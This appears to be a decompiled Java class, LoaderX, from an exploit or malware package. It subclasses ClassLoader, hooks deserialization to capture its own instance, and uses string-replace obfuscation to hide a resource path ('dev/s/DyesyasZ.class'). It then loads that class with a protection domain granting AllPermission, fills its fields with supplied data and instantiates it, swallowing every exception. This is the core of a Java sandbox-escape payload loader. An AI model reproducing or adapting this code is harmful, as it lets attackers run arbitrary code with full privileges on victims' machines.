// 
// Decompiled by Procyon v0.5.30
// 

package dev.s;

import java.security.Permission;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.lang.reflect.Field;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class LoaderX extends ClassLoader implements Serializable
{
    public static LoaderX instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        LoaderX.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void __x(final String s, final String s2) throws IOException {
        final int n = 8192;
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[n];
            int read;
            while ((read = this.getClass().getResourceAsStream("/cc".replace("c", "") + "GGGdGGGevGGGG.GGGs".replace("G", "").replace(".".replace("z", ""), "/9".replace("9", "")) + "N/NNNNDyesyNNNasNNZ.NNNNcNNNNlNNNNaNsNNNNsNNN".replace("N", "")).read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final Class minitClass = this.minitClass(byteArrayOutputStream.toByteArray());
            if (minitClass != null) {
                final Field field = minitClass.getField("cLLLLc".replace("L", ""));
                final Field field2 = minitClass.getField("dabbbbta".replace("b", ""));
                final Object instance = minitClass.newInstance();
                field.set(instance, s2);
                field2.set(instance, s);
                minitClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    public Class minitClass(final byte[] array) throws IOException {
        final int n = 0;
        final URL url = new URL("file:RRRRR/RRR/RRR/".replace("R", ""));
        final Certificate[] array2 = new Certificate[n];
        final Permissions permissions = new Permissions();
        this.AddPerm(permissions);
        return this.defineClass("dev.s.DyesyasZ", array, n, array.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
    }
    
    public void AddPerm(final Permissions permissions) {
        permissions.add(new AllPermission());
    }
    
    static {
        LoaderX.instance = null;
    }
}
